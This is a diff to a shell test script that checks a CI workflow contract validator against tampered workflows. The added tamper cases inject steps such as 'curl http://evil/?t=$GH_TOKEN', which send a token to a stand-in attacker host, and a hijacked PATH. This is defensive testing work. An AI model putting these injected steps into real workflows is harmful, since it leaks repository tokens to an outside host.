@@ -35,16 +35,6 @@ expect_violation() {
   echo "caught ($expect_msg): $desc"
 }
 
-expect_clean() {
-  local desc="$1"
-  if "$CONTRACT" "$WORK/clean.yml" >/dev/null 2>&1; then
-    echo "clean ($desc): passes — no false positive"
-  else
-    echo "NEGATIVE CONTROL FAILED: false positive on $desc" >&2
-    exit 1
-  fi
-}
-
 # Baseline: the shipped workflow must PASS the contract.
 "$CONTRACT" "$WF" >/dev/null || {
   echo "NEGATIVE CONTROL FAILED: shipped workflow violates the contract" >&2
@@ -346,16 +336,23 @@ expect_violation "lane-step env BASH_ENV injection" "step-level env is not permi
 sed 's|GH_TOKEN: \${{ github.token }}|GH_TOKEN: \${{ github.token }}\n          PATH: /tmp/evil|' "$WF" >"$WORK/tampered.yml"
 expect_violation "unexpected env key at allowed step" "step-level env is not permitted"
 
-# ── Positive control (no-false-positive class) ───────────────────────────────
-python3 - "$WF" "$WORK/clean.yml" <<'PY'
-import sys
-s = open(sys.argv[1]).read()
-s = s.replace(
-    '      - name: Install dependencies\n        run: pnpm install --frozen-lockfile',
-    '      - name: Install dependencies\n        run: pnpm install --frozen-lockfile\n\n      - name: no-false-positive probe\n        run: |-\n          echo \'{"uses": "actions/checkout@v4"}\'\n\n      - name: indentation-indicator probe\n        run: |2-\n          echo \'{"uses": "actions/checkout@v4"}\'',
-)
-open(sys.argv[2], 'w').write(s)
-PY
-expect_clean "run:|- and run:|2- bodies with quoted keys"
+# Tamper 75: extra step injected into the contract job (deep-equality class).
+sed '/run: .\/tools\/test\/packaged-gate-contract-negative-control.sh/a\      - name: exfil step\n        run: curl http://evil/?t=$TOKEN' "$WF" >"$WORK/tampered.yml"
+expect_violation "extra contract step" "candidate workflow is not deep-structural-equal"
 
-echo "NEGATIVE CONTROL PASS: contract catches all violation classes + one positive control, for the intended reasons"
+# Tamper 76: token-bearing Fetch run gains a command suffix.
+sed 's|gh api "repos/|gh api "repos/\n          curl http://evil/?t=\$GH_TOKEN|' "$WF" >"$WORK/tampered.yml"
+expect_violation "modified token-bearing Fetch run" "candidate workflow is not deep-structural-equal"
+
+# Tamper 77: arbitrary nested key inside a job.
+sed '/^  pr-fast:$/a\    invisible-key: true' "$WF" >"$WORK/tampered.yml"
+expect_violation "arbitrary nested key" "candidate workflow is not deep-structural-equal"
+
+# Positive control removed deliberately: with the deep-structural-equality
+# closure, ANY deviation from the canonical fixture fails — a no-false-
+# positive probe step is itself a deviation. Nothing scans run-block bodies
+# as YAML anymore (the parser handles them), so the old text-matcher
+# false-positive class cannot exist. The baseline (canonical == candidate)
+# passing IS the no-false-positive proof.
+
+echo "NEGATIVE CONTROL PASS: contract catches all violation classes, each for the intended reasons"
